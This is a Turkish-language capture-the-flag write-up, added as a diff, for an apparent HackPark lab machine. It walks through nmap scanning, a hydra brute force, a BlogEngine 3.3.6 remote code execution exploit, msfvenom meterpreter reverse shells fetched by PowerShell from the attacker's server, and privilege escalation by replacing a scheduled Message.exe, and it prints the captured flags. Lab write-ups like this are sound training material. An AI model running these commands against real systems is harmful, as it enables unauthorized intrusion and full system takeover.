@@ -1,0 +1,142 @@
+->nmap -sV -sC -t4 10.10.182.80
+Starting Nmap 7.60 ( https://nmap.org ) at 2023-03-15 22:37 GMT
+Nmap scan report for ip-10-10-182-80.eu-west-1.compute.internal (10.10.182.80)
+Host is up (0.00030s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 8.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 6 disallowed entries 
+| /Account/*.* /search /search.aspx /error404.aspx 
+|_/archive /archive.aspx
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: hackpark | hackpark amusements
+3389/tcp open  ssl     Microsoft SChannel TLS
+| fingerprint-strings: 
+|   TLSSessionReq: 
+|     %b*R
+|     hackpark0
+|     230314222128Z
+|     230913222128Z0
+|     hackpark0
+|     4`~6n
+|     *{Ky3Om
+|     /9yt
+|     p\xff+
+|     $0"0
+|     ?,cv
+|     1qIqo
+|_    xw?_
+| ssl-cert: Subject: commonName=hackpark
+| Not valid before: 2023-03-14T22:21:28
+|_Not valid after:  2023-09-13T22:21:28
+|_ssl-date: 2023-03-15T22:38:11+00:00; 0s from scanner time.
+
+Login sayfası var 
+Burp Suite ile brute force yaptım 
+hydra ile 
+->hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
+ password =1qaz2wsx
+
+login sayfasının versiyonunun açığına baktım
+blogengine versiyonu 3.3.6 
+
+Searchsploit exploit veritabanlarını ve sızma testi verilerini barındırır ve bu verileri kullanarak, belirli bir zafiyetle ilgili exploitler arayabilirsiniz.z
+
+->searchsploit blogengine 3.3.6  
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                                  | aspx/webapps/46353.cs
+BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution                                                  | aspx/webapps/47010.py
+BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                                                             | aspx/webapps/47035.py
+BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution                                             | aspx/webapps/47011.py
+BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                                          | aspx/webapps/47014.py
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+
+
+google->blogengine 3.3.6.0 exploit 
+
+BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution bunu indirdim
+
+Exploit'te yerel IP adresi ve port değiştiriyorum
+Exploit ismini PostView.ascx olarak değiştiriyorum 
+Exploit, BlogEngine dosya yöneticisi aracılığıyla yüklüyorum
+Kali ana bilgisayarında netcat dinleyicisini başlatıyorum
+http://10.10.79.198/?theme=../../App_Data/files ve en son bu adrese gidiyorum
+
+nc -lvnp 1234
+
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.79.198.
+Ncat: Connection from 10.10.79.198:56475.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+c:\windows\system32\inetsrv>whoami
+iis apppool\blog
+
+Yetki yükseltme için 
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=tun0 LPORT=4444 -f exe -o revshell.exe
+-p payload tipini belirtmek için, bu durumda windows meterpreter tcp revershell 
+-a mimariyi belirtmek için, bu durumda x86
+-encoder kabuk kodu için kullanılacak kodlayıcıyı belirtmek için, bu durumda shikata_ga_nai
+-Bağlanılacak IP adresi için LHOST
+-Bağlanılacak yerel port için LPORT
+-f kabuk için kullanılacak biçimi belirtmek için, bu durumda exe
+-o çıktı için shell.exe
+
+web sunucusu başlatıyorum
+->python3 -m http.server
+
+bağlantıda bunu indiriyorum
+->powershell -c "Invoke-WebRequest -Uri 'http://tun0:4444/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
+çalıştırıyorum
+->./revshell.exe
+
+
+msconsole ile yeni bağlantı
+->msfconsole -q
+->set payload windows/meterpreter/reverse_tcp
+->set lhost ip
+->set port 4444
+->exploit
+
+
+
+WindowsScheduler günlüklerinde Message.exe'nin yaklaşık her 30 saniyede bir yönetici olarak çalıştırıldığını görüyorum. Message.exe'yi reverse shell ile değiştirerek bundan faydalanabiliriz, bu şekilde admin olarak çalıştırılabilir.
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=tun0 LPORT=1234 -f exe -o Message.exe
+-> mv Message.exe message1.exe
+-> upload Message.exe
+
+-> bg
+-> use exploit/multi/handler
+->set lhost tun0
+->set port 1234
+->exploit
+
+->getuid
+Server username: HACKPARK\Administrator
+->cat user.txt 
+759bd8af507517bcfaede78a21a73e39
+
+->cd  C:\users\administrator\desktop
+->cat root.txt
+7e13d97f05f7ceb9881a3eb3d78d3e72
+
+
+Metasploit olmadan yetki yükseltme
+WinPEAS (Windows Privilege Escalation Awesome Scripts) .bat, Windows işletim sistemi üzerinde yüksek bir kullanıcı ayrıcalığı elde etmek için kullanılan bir araçtır. WinPEAS, bir hedef sistemde çalıştırıldığında, birkaç dakika içinde potansiyel zayıflıkları ve ayrıcalık yükseltme yollarını tespit etmek için bir dizi kontrol gerçekleştirir.
+
+indirip yayınlıyorum
+->wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat
+->python -m http.server
+
+Karşı sisteme yükleme ve çalıştırma
+->powershell -c "Invoke-WebRequest -Uri 'http://ip:8000/WinPEAS.bat' -OutFile 'c:\windows\temp\winpeas.exe'"
+->.\winpeas.bat
